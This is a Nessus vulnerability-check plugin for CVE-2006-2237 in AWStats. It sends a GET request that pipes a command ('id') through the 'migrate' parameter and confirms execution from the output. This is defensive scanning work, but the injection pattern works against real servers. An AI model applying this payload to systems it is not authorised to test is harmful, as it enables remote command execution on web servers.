#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21328);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-2237");
  script_bugtraq_id(17844);
  script_xref(name:"OSVDB", value:"25284");

  script_name(english:"AWStats migrate Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command using AWStats");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows for the
execution of arbitrary commands." );
 script_set_attribute(attribute:"description", value:
"The remote host is running AWStats, a free logfile analysis tool
written in Perl.

The version of AWStats installed on the remote host fails to sanitize
input to the 'migrate' parameter before passing it to a Perl 'open()'
function.  Provided 'AllowToUpdateStatsFromBrowser' is enabled in the
AWStats site configuration file, an unauthenticated attacker can
exploit this issue to execute arbitrary code on the affected host,
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.osreviews.net/reviews/comm/awstats" );
 script_set_attribute(attribute:"see_also", value:"http://awstats.sourceforge.net/awstats_security_news.php" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to AWStats version 6.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
 script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("awstats_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);

# Test an install.
install = get_kb_item(string("www/", port, "/AWStats"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");

if (!isnull(matches))
{
  dir = matches[2];

  # Exploit the flaw to run a command.
  cmd = "id";
  host = get_host_name();
  r = http_send_recv3(method:"GET", 
    item:string(
      dir, "/awstats.pl?",
      "config=", host, "&",
      "migrate=|", cmd, ";exit|awstats052006.", host, ".txt"
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
  {
    res = strstr(res, "uid=");
    res = res - strstr(res, "<br");

    report = string(
      "Nessus was able to execute the command 'id' on the remote host;\n",
      "the output was:\n",
      "\n",
      res
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
